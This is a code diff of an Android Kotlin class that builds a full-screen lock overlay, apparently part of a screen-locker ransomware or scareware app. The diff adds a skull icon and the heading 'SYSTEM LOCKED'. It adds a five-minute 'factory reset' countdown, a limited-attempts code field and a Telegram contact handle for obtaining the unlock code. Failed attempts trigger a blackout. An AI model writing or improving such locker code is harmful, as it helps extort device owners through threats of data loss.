@@ -3,6 +3,7 @@ package com.rocket.deadlinelock
 import android.content.Context
 import android.graphics.Color
 import android.graphics.PixelFormat
+import android.graphics.drawable.GradientDrawable
 import android.os.Handler
 import android.os.Looper
 import android.os.Vibrator
@@ -47,72 +48,122 @@ class LockOverlay(private val context: Context) {
 
     fun show() {
         if (view != null) return
+        
+        // Главный контейнер (темный фон)
         val root = LinearLayout(context).apply {
             orientation = LinearLayout.VERTICAL
             gravity = Gravity.CENTER
-            setBackgroundColor(Color.parseColor("#080000"))
-            setPadding(48, 48, 48, 48)
+            setBackgroundColor(Color.parseColor("#050000"))
+            setPadding(50, 50, 50, 50)
+        }
+
+        // Иконка черепа / предупреждения
+        val icon = TextView(context).apply {
+            text = "☠"
+            setTextColor(Color.parseColor("#FF0000"))
+            textSize = 64f
+            gravity = Gravity.CENTER
+            setShadowLayer(15f, 0f, 0f, Color.RED)
         }
 
         val title = TextView(context).apply {
-            text = "ТЕЛЕФОН ЗАБЛОКИРОВАН"
-            setTextColor(Color.parseColor("#FF1A1A"))
-            textSize = 26f; gravity = Gravity.CENTER
+            text = "СИСТЕМА ЗАБЛОКИРОВАНА"
+            setTextColor(Color.WHITE)
+            textSize = 24f
+            setShadowLayer(10f, 0f, 0f, Color.RED)
+            gravity = Gravity.CENTER
+            setPadding(0, 10, 0, 20)
         }
 
         val warn = TextView(context).apply {
-            text = "ЕСЛИ НЕ ВВЕСТИ КОД,\nТЕЛЕФОН ОТКЛЮЧИТСЯ\nИ ВСЕ ДАННЫЕ СТЁРТЫ"
-            setTextColor(Color.parseColor("#FF6666"))
-            textSize = 15f; gravity = Gravity.CENTER
-            setPadding(0, 12, 0, 12)
+            text = "ФАБРИЧНЫЙ СБРОС ЧЕРЕЗ:"
+            setTextColor(Color.parseColor("#AA0000"))
+            textSize = 16f
+            gravity = Gravity.CENTER
         }
 
+        timerText = TextView(context).apply {
+            text = "05:00"
+            setTextColor(Color.parseColor("#FF4444"))
+            textSize = 48f
+            gravity = Gravity.CENTER
+            setShadowLayer(20f, 0f, 0f, Color.RED)
+            setPadding(0, 0, 0, 20)
+        }
+
+        val warn2 = TextView(context).apply {
+            text = "ПОПЫТОК ВВОДА:"
+            setTextColor(Color.parseColor("#AA0000"))
+            textSize = 16f
+            gravity = Gravity.CENTER
+        }
+
+        attemptsText = TextView(context).apply {
+            text = "5"
+            setTextColor(Color.WHITE)
+            textSize = 28f
+            gravity = Gravity.CENTER
+            setPadding(0, 0, 0, 30)
+        }
+
+        input = EditText(context).apply {
+            hint = "ВВЕДИТЕ КОД"
+            setTextColor(Color.WHITE)
+            setHintTextColor(Color.parseColor("#555555"))
+            gravity = Gravity.CENTER
+            textSize = 20f
+            inputType = android.text.InputType.TYPE_CLASS_TEXT or
+                    android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
+            
+            // Красивая рамка для поля ввода
+            val bg = GradientDrawable().apply {
+                setColor(Color.TRANSPARENT)
+                setStroke(4, Color.parseColor("#880000"))
+                cornerRadius = 15f
+            }
+            background = bg
+            setPadding(20, 20, 20, 20)
+        }
+
+        btn = Button(context).apply {
+            text = "РАЗБЛОКИРОВАТЬ"
+            setTextColor(Color.WHITE)
+            setBackgroundColor(Color.parseColor("#880000"))
+            setPadding(20, 20, 20, 20)
+            setOnClickListener { checkPassword() }
+        }
+
+        // Кнопки Telegram и VPN (в самом низу)
         val tgBtn = Button(context).apply {
-            text = "Telegram @qwerty112005"
+            text = "TG: @qwerty112005"
+            setBackgroundColor(Color.TRANSPARENT)
+            setTextColor(Color.parseColor("#4444FF"))
             setOnClickListener {
                 if (!AppLauncher.openTelegram(context))
-                    attemptsText?.text = "Telegram не найден"
+                    attemptsText?.text = "TG не найден"
             }
         }
 
         val vpnBtn = Button(context).apply {
-            text = "Открыть VPN"
+            text = "ОТКРЫТЬ VPN"
+            setBackgroundColor(Color.TRANSPARENT)
+            setTextColor(Color.parseColor("#4444FF"))
             setOnClickListener {
                 if (!AppLauncher.openVpn(context))
                     attemptsText?.text = "VPN не найден"
             }
         }
 
-        timerText = TextView(context).apply {
-            text = "ОСТАЛОСЬ: 05:00"
-            setTextColor(Color.parseColor("#FFAA00"))
-            textSize = 24f; gravity = Gravity.CENTER
-            setPadding(0, 12, 0, 12)
-        }
-
-        attemptsText = TextView(context).apply {
-            text = "ПОПЫТОК: 5"
-            setTextColor(Color.parseColor("#CCCCCC"))
-            textSize = 17f; gravity = Gravity.CENTER
-            setPadding(0, 0, 0, 12)
-        }
-
-        input = EditText(context).apply {
-            hint = "Введите пароль"
-            setTextColor(Color.WHITE); setHintTextColor(Color.GRAY)
-            inputType = android.text.InputType.TYPE_CLASS_TEXT or
-                    android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
-        }
-
-        btn = Button(context).apply {
-            text = "ПРОВЕРИТЬ"
-            setOnClickListener { checkPassword() }
-        }
-
-        root.addView(title); root.addView(warn)
-        root.addView(tgBtn); root.addView(vpnBtn)
-        root.addView(timerText); root.addView(attemptsText)
-        root.addView(input); root.addView(btn)
+        root.addView(icon)
+        root.addView(title)
+        root.addView(warn)
+        root.addView(timerText)
+        root.addView(warn2)
+        root.addView(attemptsText)
+        root.addView(input)
+        root.addView(btn)
+        root.addView(tgBtn)
+        root.addView(vpnBtn)
 
         val params = WindowManager.LayoutParams(
             WindowManager.LayoutParams.MATCH_PARENT,
@@ -136,11 +187,11 @@ class LockOverlay(private val context: Context) {
         if (input?.text.toString() == correctPin) unlock()
         else {
             attemptsLeft--
-            attemptsText?.text = "ПОПЫТОК: $attemptsLeft"
+            attemptsText?.text = attemptsLeft.toString()
             input?.setText("")
             vibrate(400)
             if (attemptsLeft <= 0) {
-                attemptsText?.text = "ПОПЫТКИ ИСЧЕРПАНЫ"
+                attemptsText?.text = "0 (СБРОС)"
                 goBlackout()
             }
         }
